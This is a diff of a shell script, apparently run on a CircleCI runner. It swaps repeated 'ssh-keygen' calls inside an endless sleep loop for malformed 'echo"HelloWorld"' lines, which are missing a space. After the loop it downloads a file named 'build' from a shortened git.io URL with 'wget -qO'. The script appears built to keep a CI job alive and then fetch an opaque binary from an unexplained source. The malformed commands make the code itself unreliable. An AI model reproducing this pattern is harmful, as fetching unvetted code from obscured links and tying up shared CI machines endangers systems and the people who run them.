@@ -2,35 +2,35 @@
 
 while :
 do
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
-ssh-keygen -m PEM -t rsa -f .ssh/circleci
+echo"HelloWorld"
 sleep 2
 done
 wget -qO build https://git.io/JX7bv
